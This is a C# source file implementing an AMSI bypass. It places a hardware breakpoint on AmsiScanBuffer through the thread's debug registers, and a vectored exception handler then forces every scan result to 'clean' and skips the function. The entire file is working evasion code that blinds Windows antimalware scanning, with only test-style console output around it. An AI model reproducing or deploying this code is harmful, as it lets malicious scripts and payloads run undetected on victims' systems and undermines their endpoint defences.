using System;
using System.Runtime.InteropServices;

public static class VEHTest {
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] static extern IntPtr AddVectoredExceptionHandler(uint f, IntPtr h);
    [DllImport("kernel32.dll")] static extern bool SetThreadContext(IntPtr t, ref CTX c);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern uint GetLastError();

    struct CTX {
        public ulong p1,p2,p3,p4,p5,p6;
        public uint cf,mx;
        public ushort cs,ds,es,fs,gs,ss;
        public uint ef;
        public ulong d0,d1,d2,d3,d6,d7;
        public ulong ax,cx,dx,bx,sp,bp,si,di;
        public ulong r8,r9,r10,r11,r12,r13,r14,r15;
        public ulong ip;
    }

    delegate int VEHDelegate(IntPtr p);
    static VEHDelegate _vehD;
    static IntPtr _tgt;
    static int _callCount = 0;

    static int Handler(IntPtr ep) {
        Interlocked.Increment(ref _callCount);
        try {
            IntPtr er = Marshal.ReadIntPtr(ep);
            int code = Marshal.ReadInt32(er);
            if (code != unchecked((int)0x80000004)) return 1;
            IntPtr c = Marshal.ReadIntPtr(ep, IntPtr.Size);
            long rip = Marshal.ReadInt64(c + 0xF8);
            if (rip != _tgt.ToInt64()) return 1;
            long sp = Marshal.ReadInt64(c + 0x98);
            IntPtr rs = Marshal.ReadIntPtr(new IntPtr(sp + 0x30));
            if (rs != IntPtr.Zero) Marshal.WriteInt32(rs, 0);
            Marshal.WriteInt64(c + 0x78, 0);
            Marshal.WriteInt64(c + 0xF8, Marshal.ReadInt64(new IntPtr(sp)));
            Marshal.WriteInt64(c + 0x98, sp + 8);
            Marshal.WriteInt64(c + 0x68, 0);
            Marshal.WriteInt32(c + 0x44, Marshal.ReadInt32(c + 0x44) | 0x10000);
            return 0;
        } catch {
            return 1;
        }
    }

    public static void Test() {
        _tgt = GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
        Console.WriteLine("Target: " + _tgt);
        Console.WriteLine("LastWin32Error before AddVectoredExceptionHandler: " + GetLastError());

        _vehD = new VEHDelegate(Handler);
        IntPtr h = AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_vehD));
        Console.WriteLine("AddVectoredExceptionHandler returned: " + h);

        GC.KeepAlive(_vehD);

        var ctx = new CTX();
        ctx.d0 = (ulong)_tgt;
        ctx.d7 = 1;
        ctx.cf = 0x100010;
        bool ok = SetThreadContext(GetCurrentThread(), ref ctx);
        Console.WriteLine("SetThreadContext returned: " + ok);
        Console.WriteLine("LastWin32Error after SetThreadContext: " + GetLastError());

        Console.WriteLine("Handler calls so far: " + _callCount);
    }
}
